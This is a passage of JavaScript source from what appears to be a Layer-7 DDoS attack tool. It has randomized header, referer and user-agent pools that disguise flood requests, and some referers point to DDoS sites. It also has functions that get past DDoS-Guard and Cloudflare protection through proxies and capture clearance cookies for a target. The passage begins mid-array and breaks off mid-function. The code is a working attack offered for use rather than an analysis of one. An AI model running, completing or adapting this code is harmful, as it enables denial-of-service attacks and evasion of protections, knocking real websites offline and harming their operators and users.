"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel", "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8"];
const lang_header = ['ko-KR', "en-US", "zh-CN", 'zh-TW', "ja-JP", "en-GB", "en-AU", "en-GB,en-US;q=0.9,en;q=0.8", 'en-GB,en;q=0.5', 'en-CA', "en-UK, en, de;q=0.5", 'en-NZ', "en-GB,en;q=0.6", "en-ZA", "en-IN", "en-PH", "en-SG", 'en-HK', "en-GB,en;q=0.8", "en-GB,en;q=0.9", " en-GB,en;q=0.7", "en-US,en;q=0.9", 'en-GB,en;q=0.9', 'en-CA,en;q=0.9', "en-AU,en;q=0.9", 'en-NZ,en;q=0.9', 'en-ZA,en;q=0.9', "en-IE,en;q=0.9", "en-IN,en;q=0.9", 'ar-SA,ar;q=0.9', "az-Latn-AZ,az;q=0.9", "be-BY,be;q=0.9", "bg-BG,bg;q=0.9", "bn-IN,bn;q=0.9", "ca-ES,ca;q=0.9", "cs-CZ,cs;q=0.9", "cy-GB,cy;q=0.9", 'da-DK,da;q=0.9', 'de-DE,de;q=0.9', 'el-GR,el;q=0.9', "es-ES,es;q=0.9", "et-EE,et;q=0.9", "eu-ES,eu;q=0.9", "fa-IR,fa;q=0.9", "fi-FI,fi;q=0.9", "fr-FR,fr;q=0.9", 'ga-IE,ga;q=0.9', "gl-ES,gl;q=0.9", "gu-IN,gu;q=0.9", "he-IL,he;q=0.9", "hi-IN,hi;q=0.9", 'hr-HR,hr;q=0.9', "hu-HU,hu;q=0.9", "hy-AM,hy;q=0.9", "id-ID,id;q=0.9", "is-IS,is;q=0.9", "it-IT,it;q=0.9", "ja-JP,ja;q=0.9", "ka-GE,ka;q=0.9", "kk-KZ,kk;q=0.9", "km-KH,km;q=0.9", "kn-IN,kn;q=0.9", "ko-KR,ko;q=0.9", 'ky-KG,ky;q=0.9', "lo-LA,lo;q=0.9", 'lt-LT,lt;q=0.9', "lv-LV,lv;q=0.9", "mk-MK,mk;q=0.9", "ml-IN,ml;q=0.9", 'mn-MN,mn;q=0.9', 'mr-IN,mr;q=0.9', "ms-MY,ms;q=0.9", 'mt-MT,mt;q=0.9', "my-MM,my;q=0.9", "nb-NO,nb;q=0.9", 'ne-NP,ne;q=0.9', "nl-NL,nl;q=0.9", 'nn-NO,nn;q=0.9', "or-IN,or;q=0.9", "pa-IN,pa;q=0.9", "pl-PL,pl;q=0.9", "pt-BR,pt;q=0.9", "pt-PT,pt;q=0.9", "ro-RO,ro;q=0.9", "ru-RU,ru;q=0.9", "si-LK,si;q=0.9", "sk-SK,sk;q=0.9", "sl-SI,sl;q=0.9", "sq-AL,sq;q=0.9", 'sr-Cyrl-RS,sr;q=0.9', 'sr-Latn-RS,sr;q=0.9', "sv-SE,sv;q=0.9", 'sw-KE,sw;q=0.9', 'ta-IN,ta;q=0.9', 'te-IN,te;q=0.9', "th-TH,th;q=0.9", "tr-TR,tr;q=0.9", "uk-UA,uk;q=0.9", "ur-PK,ur;q=0.9", 'uz-Latn-UZ,uz;q=0.9', 'vi-VN,vi;q=0.9', 'zh-CN,zh;q=0.9', "zh-HK,zh;q=0.9", "zh-TW,zh;q=0.9", 'am-ET,am;q=0.8', "as-IN,as;q=0.8", "az-Cyrl-AZ,az;q=0.8", "bn-BD,bn;q=0.8", 'bs-Cyrl-BA,bs;q=0.8', "bs-Latn-BA,bs;q=0.8", "dz-BT,dz;q=0.8", "fil-PH,fil;q=0.8", "fr-CA,fr;q=0.8", 'fr-CH,fr;q=0.8', "fr-BE,fr;q=0.8", "fr-LU,fr;q=0.8", "gsw-CH,gsw;q=0.8", "ha-Latn-NG,ha;q=0.8", "hr-BA,hr;q=0.8", 'ig-NG,ig;q=0.8', 'ii-CN,ii;q=0.8', "is-IS,is;q=0.8", "jv-Latn-ID,jv;q=0.8", "ka-GE,ka;q=0.8", "kkj-CM,kkj;q=0.8", "kl-GL,kl;q=0.8", "km-KH,km;q=0.8", 'kok-IN,kok;q=0.8', "ks-Arab-IN,ks;q=0.8", 'lb-LU,lb;q=0.8', 'ln-CG,ln;q=0.8', 'mn-Mong-CN,mn;q=0.8', "mr-MN,mr;q=0.8", 'ms-BN,ms;q=0.8', 'mt-MT,mt;q=0.8', "mua-CM,mua;q=0.8", "nds-DE,nds;q=0.8", "ne-IN,ne;q=0.8", "nso-ZA,nso;q=0.8", "oc-FR,oc;q=0.8", "pa-Arab-PK,pa;q=0.8", "ps-AF,ps;q=0.8", "quz-BO,quz;q=0.8", "quz-EC,quz;q=0.8", "quz-PE,quz;q=0.8", "rm-CH,rm;q=0.8", "rw-RW,rw;q=0.8", 'sd-Arab-PK,sd;q=0.8', "se-NO,se;q=0.8", "si-LK,si;q=0.8", "smn-FI,smn;q=0.8", "sms-FI,sms;q=0.8", 'syr-SY,syr;q=0.8', "tg-Cyrl-TJ,tg;q=0.8", "ti-ER,ti;q=0.8", 'tk-TM,tk;q=0.8', "tn-ZA,tn;q=0.8", "tt-RU,tt;q=0.8", "ug-CN,ug;q=0.8", 'uz-Cyrl-UZ,uz;q=0.8', "ve-ZA,ve;q=0.8", 'wo-SN,wo;q=0.8', "xh-ZA,xh;q=0.8", "yo-NG,yo;q=0.8", "zgh-MA,zgh;q=0.8", "zu-ZA,zu;q=0.8"];
const encoding_header = ["gzip, deflate, br", "gzip, deflate, br, zstd", "compress, gzip", "deflate, gzip", "gzip, identity", '*', '*', "*/*", 'gzip', "gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", "gzip, deflate", 'br', "br;q=1.0, gzip;q=0.8, *;q=0.1", "gzip;q=1.0, identity; q=0.5, *;q=0", "gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25", "compress;q=0.5, gzip;q=1.0", "identity", "gzip, compress", "compress, deflate", "compress", "gzip, deflate, br", "deflate", "gzip, deflate, lzma, sdch", "deflate"];
const control_header = ["max-age=604800", "proxy-revalidate", "public, max-age=0", "max-age=315360000", "public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800", 's-maxage=604800', 'max-stale', "public, immutable, max-age=31536000", "must-revalidate", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "max-age=31536000,public,immutable", 'max-age=31536000,public', "min-fresh", "private", "public", "s-maxage", "no-cache", "no-cache, no-transform", "max-age=2592000", "no-store", "no-transform", 'max-age=31557600', "stale-if-error", "only-if-cached", "max-age=0", "must-understand, no-store", "max-age=31536000; includeSubDomains", "max-age=31536000; includeSubDomains; preload", 'max-age=120', "max-age=0,no-cache,no-store,must-revalidate", "public, max-age=604800, immutable", "max-age=0, must-revalidate, private", "max-age=0, private, must-revalidate", "max-age=604800, stale-while-revalidate=86400", "max-stale=3600", "public, max-age=2678400", "min-fresh=600", "public, max-age=30672000", "max-age=31536000, immutable", "max-age=604800, stale-if-error=86400", "public, max-age=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "o-cache, no-store, must-revalidate, pre-check=0, post-check=0", "public, s-maxage=600, max-age=60", "public, max-age=31536000", "max-age=14400, public", "max-age=14400", "max-age=600, private", "public, s-maxage=600, max-age=60", "no-store, no-cache, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "X-Access-Control: Allow-Origin", "Cache-Control: no-cache, no-store, must-revalidate", "Authorization: Bearer your_token", "Content-Control: no-transform", "X-RateLimit-Limit: 1000", "Proxy-Connection: keep-alive", "X-Frame-Options: SAMEORIGIN", "Strict-Transport-Security: max-age=31536000; includeSubDomains", "X-Content-Type-Options: nosniff", "Retry-After: 120", "Connection: close", "Accept-Ranges: bytes", "ETag: \"33a64df551425fcc55e4d42a148795d9f25f89d4\"", "X-DNS-Prefetch-Control: off", "Expires: Thu, 01 Jan 1970 00:00:00 GMT", "X-Download-Options: noopen", "X-Permitted-Cross-Domain-Policies: none", "X-Frame-Options: DENY", "Expect-CT: max-age=86400, enforce", "Upgrade-Insecure-Requests: 1", "X-Forwarded-Proto: https", "Access-Control-Allow-Origin: *", "X-Content-Duration: 3600", "Alt-Svc: h3=\":443\"", "X-XSS-Protection: 1; mode=block", "Referrer-Policy: no-referrer", "X-Pingback: /xmlrpc.php", "Content-Encoding: gzip", "Age: 3600", "X-Clacks-Overhead: GNU Terry Pratchett", "Server: Apache/2.4.41 (Unix)", "X-Powered-By: PHP/7.4.3", "Allow: GET, POST, HEAD", "Retry-After: 3600", "Access-Control-Allow-Methods: GET, POST, OPTIONS", "X-UA-Compatible: IE=edge", "Public-Key-Pins: max-age=5184000; pin-sha256=\"base64+primary==\"; pin-sha256=\"base64+backup==\"; includeSubDomains; report-uri=\"https://example.com/hpkp-report\"", "Content-Language: en-US", "X-Permitted-Cross-Domain-Policies: none", "Strict-Transport-Security: max-age=15768000; includeSubDomains", "Access-Control-Allow-Headers: Content-Type", "X-Frame-Options: ALLOW-FROM https://example.com/", "X-Robots-Tag: noindex, nofollow", "Access-Control-Max-Age: 3600", "X-Cache-Status: MISS", "Vary: Accept-Encoding", "X-GeoIP-Country-Code: US", "X-Do-Not-Track: 1", "X-Request-ID: 12345", "X-Correlation-ID: abcde", "DNT: 1", "X-Device-Type: mobile", "X-Device-OS: Android", "X-Device-Model: Galaxy S10", "X-App-Version: 2.1.0", "X-User-ID: 123", "X-Session-ID: xyz", "X-Feature-Flag: new_feature_enabled", "X-Experiment-ID: experiment_123", "X-Ab-Test: variant_b", "X-Tracking-Consent: accepted", "X-Customer-Segment: premium", "X-User-Role: admin", "X-Client-ID: client_567", "X-Internal-Request: true", "X-Service-Name: backend-api", "X-Backend-Server: server-1", "X-Database-Query: SELECT * FROM users", "X-Cache-Control: no-store", "X-Environment: production", "X-Debug-Mode: false", "X-Remote-IP: 203.0.113.195", "X-Proxy: true", "X-Origin: https://www.example.com", "X-FastCGI-Cache: HIT", "X-Pagination-Total: 1000", "X-Pagination-Page: 5", "X-Pagination-Limit: 20", "X-Notification-Count: 3", "X-Message-ID: msg_123", "X-Notification-Type: alert", "X-Notification-Priority: high", "X-Queue-Depth: 50", "X-Queue-Position: 10", "X-Queue-Status: active", "X-Content-Hash: sha256=abcdef123456", "X-Resource-ID: resource_789", "X-Resource-Type: article", "X-Transaction-ID: tx_456", "X-Transaction-Status: success", "X-Transaction-Amount: $100.00", "X-Transaction-Currency: USD", "X-Transaction-Date: 2024-01-24T12:00:00Z", "X-Payment-Method: credit_card", "X-Payment-Status: authorized", "X-Shipping-Method: express", "X-Shipping-Cost: $10.00", "X-Subscription-Status: active", "X-Subscription-Type: premium", "Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64"];
const refers = ["https://captcha.request123.xyz/?__cf_chl_tk=FfHpmlpM4i4EZ4rflLFtMgD2WqkoR5pCXfcXro4KcdI-1713811530-0.0.1.1-1322", "http://anonymouse.org/cgi-bin/anon-www.cgi/", 'https://cfcybernews.eu/?__cf_chl_tk=V0gHmpGB_XzSs.8hyrlf.xMbIrYR7CIXMWaHbYDk4qY-1713811672-0.0.1.1-1514', "http://coccoc.com/search#query=", "http://ddosvn.somee.com/f5.php?v=", 'http://engadget.search.aol.com/search?q=', "http://eu.battle.net/wow/en/search?q=", "http://filehippo.com/search?q=", "http://funnymama.com/search?q=", "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=", "http://help.baidu.com/searchResult?keywords=", "http://host-tracker.com/check_page/?furl=", "http://itch.io/search?q=", "http://jigsaw.w3.org/css-validator/validator?uri=", "http://jobs.bloomberg.com/search?q=", "http://jobs.leidos.com/search?q=", "http://jobs.rbs.com/jobs/search?q=", "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=", "http://louis-ddosvn.rhcloud.com/f5.html?v=", "http://millercenter.org/search?q=", 'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=', "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=", 'http://php-hrdevil.rhcloud.com/f5ddos3.html?v=', "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=", "http://search.aol.com/aol/search?q=", "http://taginfo.openstreetmap.org/search?q=", "http://techtv.mit.edu/search?q=", "http://validator.w3.org/feed/check.cgi?url=", "http://vk.com/profile.php?redirect=", 'http://www.ask.com/web?q=', 'http://www.baoxaydung.com.vn/news/vn/search&q=', "http://www.bestbuytheater.com/events/search?q=", "http://www.bing.com/search?q=", 'http://www.evidence.nhs.uk/search?q=', "http://www.google.com/?q=", "http://www.google.com/translate?u=", "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=", "http://www.pagescoring.com/website-speed-test/?url=", 'http://www.reddit.com/search?q=', "http://www.search.com/search?q=", 'http://www.shodanhq.com/search?q=', "http://www.ted.com/search?q=", 'http://www.topsiteminecraft.com/site/pinterest.com/search?q=', "http://www.usatoday.com/search/results?q=", 'http://www.ustream.tv/search?q=', "http://yandex.ru/yandsearch?text=", "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=", 'https://add.my.yahoo.com/rss?url=', "https://careers.carolinashealthcare.org/search?q=", "https://check-host.net/", "https://developers.google.com/speed/pagespeed/insights/?url=", "https://drive.google.com/viewerng/viewer?url=", "https://duckduckgo.com/?q=", "https://google.com/", "https://play.google.com/store/search?q=", "https://pornhub.com/", "https://r.search.yahoo.com/", "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=", "https://steamcommunity.com/market/search?q=", "https://vk.com/profile.php?redirect=", "https://www.bing.com/search?q=", "https://www.cia.gov/index.html", 'https://www.facebook.com/', "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=", 'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=', "https://www.fbi.com/", "https://www.google.ad/search?q=", 'https://www.google.ae/search?q=', "https://www.google.al/search?q=", "https://www.google.co.ao/search?q=", "https://www.google.com.af/search?q=", 'https://www.google.com.ag/search?q=', "https://www.google.com.ai/search?q=", "https://www.google.com/search?q=", "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=", "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=", "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=", "https://www.npmjs.com/search?q=", "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=", "https://www.pinterest.com/search/?q=", "https://www.qwant.com/search?q=", 'https://www.ted.com/search?q=', "https://www.usatoday.com/search/results?q=", 'https://www.yandex.com/yandsearch?text=', "https://www.youtube.com/"];
const Methods = ['GET', "HEAD", "POST", "PUT", 'DELETE', "CONNECT", "OPTIONS", "TRACE", "PATCH", "PURGE", "LINK", "UNLINK"];
const queryString = ['', '&', '?', '&&', 'and', '=', '+', '?', '=', '&', '=', '&', '=', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&'];
const useragentl = ["(CheckSecurity 2_0)", "(BraveBrowser 5_0)", "(ChromeBrowser 3_0)", "(ChromiumBrowser 4_0)", "(AtakeBrowser 2_0)", "(NasaChecker)", "(CloudFlareIUAM)", '(NginxChecker)', "(AAPanel)", "(AntiLua)", "(FushLua)", "(FBIScan)", "(FirefoxTop)", "(ChinaNet Bot)", "(Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36)", "(Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0)", "(Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36)", "(Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1)", "(Googlebot/2.1; +http://www.google.com/bot.html)", "(Bingbot/2.0; +http://www.bing.com/bingbot.htm)", "(YandexBot/3.0; +http://yandex.com/bots)", "(DuckDuckBot/1.0; +https://duckduckgo.com/duckduckbot)", "(Scrapy/2.4.0; +https://scrapy.org)", "(Wget/1.21.1)", "(curl/7.68.0)", "(Python-requests/2.25.1)", "(Apache-HttpClient/4.5.13)", "(PostmanRuntime/7.28.0)", '(Insomnia/2021.5.2)', "(Java/11.0.10)", "(Go-http-client/1.1)", "(HttpClient/4.5)", "(HTTrack 3.49; Windows)", "(WebScraperBot/1.0; +https://webscraper.io/bot)"];
const mozilla = ["Mozilla/5.0 ", "Mozilla/6.0 ", "Mozilla/7.0 ", "Mozilla/8.0 ", "Mozilla/9.0 "];
const platform = ['Windows', 'Macintosh', "Linux", 'Android', "PlayStation 4", "iPhone", "iPad", "Windows Phone",, "iOS", "Android", "PlayStation 5", "Xbox One", "Nintendo Switch", "Apple TV", "Amazon Fire TV", 'Roku', "Chromecast", "Smart TV", "Other"];
const version = ["\"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"", "\"Chromium\";v=\"109\", \"Google Chrome\";v=\"109\"", "\"Chromium\";v=\"121\", \"Google Chrome\";v=\"121\", \"Opera GX\";v=\"106\"", "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"", "\"Firefox\";v=\"11\", \"Chromium\";v=\"98\", \"(Not A:Brand\";v=\"8\"", "\"Firefox\";v=\"24\", \"Presto\";v=\"2.7.62\", \"Firefox\";v=\"17\"", "\"Firefox\";v=\"29\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"", "\"Firefox\";v=\"31\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"", "\"Firefox\";v=\"40\", \"Google Chrome\";v=\"96\", \"Chromium\";v=\"96\"", "\"Google Chrome\";v=\"42\", \"Google Chrome\";v=\"51\", \"Google Chrome\";v=\"58\"", "\"Google Chrome\";v=\"58\", \"Google Chrome\";v=\"42\", \"Google Chrome\";v=\"51\"", "\"Google Chrome\";v=\"72\", \"Google Chrome\";v=\"104\", \"Google Chrome\";v=\"109\"", "\"Google Chrome\";v=\"86\", \"Not_A Brand\";v=\"99\", \"Chromium\";v=\"86\"", "\"Google Chrome\";v=\"96\", \"Not_A Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\"", "\"Google Chrome\";v=\"96\", \"Firefox\";v=\"29\", \"Chromium\";v=\"96\"", "\"Google Chrome\";v=\"100\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"107\"", "\"Google Chrome\";v=\"101\", \"Microsoft Edge\";v=\"100\", \"Google Chrome\";v=\"101\"", "\"Google Chrome\";v=\"104\", \"Google Chrome\";v=\"109\", \"Google Chrome\";v=\"72\"", "\"Google Chrome\";v=\"107\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"", "\"Google Chrome\";v=\"109\", \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"109\"", "\"Google Chrome\";v=\"112\", \"Google Chrome\";v=\"113\", \"Not A Brand\";v=\"99\"", "\"Google Chrome\";v=\"113\", \"Google Chrome\";v=\"112\", \"Not A Brand\";v=\"99\"", "\"Microsoft Edge\";v=\"96\", \"Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\"", "\"Microsoft Edge\";v=\"100\", \"Google Chrome\";v=\"101\", \"Google Chrome\";v=\"101\"", "\"Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\"", "\"Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Opera\";v=\"86\"", "\"Not_A Brand\";v=\"8\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"", "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"86\", \"Chromium\";v=\"86\"", "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"96\", \"Chromium\";v=\"96\"", "\"Not_A Brand\";v=\"24\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\", \"Opera GX\";v=\"106\""];
const browsers = ["Microsoft Edge", "Google Chrome", "Firefox", 'Safari', "Opera", "Chrome Android", "Samsung Internet", "WebView Android"];
const sechuas = ['Android', "Chrome OS", "Chromium OS", 'iOS', "Linux", 'macOS', 'Unknown', "Windows"];
// --- Pilih nilai acak ---
var RipperSec = Methods[Math.floor(Math.random() * Methods.length)];
var randomReferer = refers[Math.floor(Math.random() * refers.length)];
var cipper = cplist[Math.floor(Math.random() * cplist.length)];
var siga = sig[Math.floor(Math.random() * sig.length)];
var platform1 = platform[Math.floor(Math.random() * platform.length)];
var versi = version[Math.floor(Math.random() * version.length)];
var uap1 = userAgents[Math.floor(Math.random() * userAgents.length)];
var accept = accept_header[Math.floor(Math.random() * accept_header.length)];
var lang = lang_header[Math.floor(Math.random() * lang_header.length)];
var moz = mozilla[Math.floor(Math.random() * mozilla.length)];
var az1 = useragentl[Math.floor(Math.random() * useragentl.length)];
var encoding = encoding_header[Math.floor(Math.random() * encoding_header.length)];
var control = control_header[Math.floor(Math.random() * control_header.length)];

// export kalau perlu
module.exports = bypass;

//== bypass ddossguard ==
const request = require("request");
const cloudscraper = require("cloudscraper");

function encode(string) {
    return Buffer.from(string).toString("base64");
}

function Dsguard(proxy, uagent, callback, force, cookie) {
    if (!cookie) {
        cookie = "";
    }

    const hS = encode(l7.parsed.protocol + "//" + l7.parsed.host);
    const uS = encode(l7.parsed.path);
    const pS = encode(l7.parsed.port || "");

    if (["5sec", "free"].indexOf(l7.firewall[1]) !== -1 || force) {
        let bypassJar = request.jar();

        request.get({
            url: l7.parsed.protocol + "//ddgu.ddos-guard.net/g",
            gzip: true,
            proxy: proxy,
            jar: bypassJar,
            headers: {
                "Connection": "keep-alive",
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": 1,
                "User-Agent": uagent,
                "Accept": "image/webp,image/apng,image/*,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US;q=0.9",
                "Referer": l7.target,
                "Origin": l7.parsed.protocol + "//" + l7.parsed.host
            }
        }, (err, res, body) => {
            if (err || !res || !body) return false;

            request.get({
                url: l7.parsed.protocol + "//ddgu.ddos-guard.net/c",
                gzip: true,
                proxy: proxy,
                jar: bypassJar,
                headers: {
                    "Connection": "keep-alive",
                    "User-Agent": uagent,
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Referer": l7.target,
                    "Origin": l7.parsed.protocol + "//" + l7.parsed.host,
                    "Accept-Language": "en-US;q=0.9"
                }
            }, (err, res, body) => {
                if (err || !res || !body) return false;

                request.post({
                    url: l7.parsed.protocol + "//ddgu.ddos-guard.net/ddgu/",
                    gzip: true,
                    proxy: proxy,
                    jar: bypassJar,
                    followAllRedirects: true,
                    headers: {
                        "Connection": "Keep-Alive",
                        "Cache-Control": "max-age=0",
                        "Upgrade-Insecure-Requests": 1,
                        "User-Agent": uagent,
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Referer": l7.target,
                        "Origin": l7.parsed.protocol + "//" + l7.parsed.host,
                        "Accept-Language": "en-US;q=0.9"
                    },
                    form: {
                        u: uS,
                        h: hS,
                        p: pS
                    }
                }, (err, res, body) => {
                    if (err || !res || !body) return false;

                    if (body.indexOf("enter the symbols from the picture to the form below. </div>") !== -1) {
                        logger("[ddos-guard] Captcha received, Ip rep died.");
                    } else {
                        callback(res.request.headers.cookie);
                    }
                });
            });
        });

    } else {
        cloudscraper.get({
            url: l7.target,
            gzip: true,
            proxy: proxy,
            jar: true,
            followAllRedirects: true,
            headers: {
                "Connection": "Keep-Alive",
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": 1,
                "User-Agent": uagent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US;q=0.9"
            }
        }, (err, res, body) => {
            if (err || !res || !body) return false;

            if (res.request.headers.cookie) {
                callback(res.request.headers.cookie);
            } else {
                if (res.statusCode == 403 && body.indexOf("<title>DDOS-GUARD</title>") !== -1) {
                    return bypass(proxy, uagent, callback, true);
                } else {
                    return false;
                }
            }
        });
    }
}
//== bypass cloudflare 
let privacyPassSupport = true;

function useNewToken() {
    privacypass(l7.target);
    console.log("[cloudflare-bypass ~ privacypass]: generated new token");
}

if (l7.firewall[1] === "captcha") {
    privacyPassSupport = l7.firewall[2];
    useNewToken();
}

function bypassCloudflare(proxy, uagent, callback, force) {
    let num = Math.random() * Math.pow(Math.random(), Math.floor(Math.random() * 10));
    let cookie = "";

    if (l7.firewall[1] === "captcha" || (force && privacyPassSupport)) {
        request.get({
            url: l7.target + "?_asds=" + num,
            gzip: true,
            proxy: proxy,
            headers: {
                "Connection": "Keep-Alive",
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": 1,
                "User-Agent": uagent,
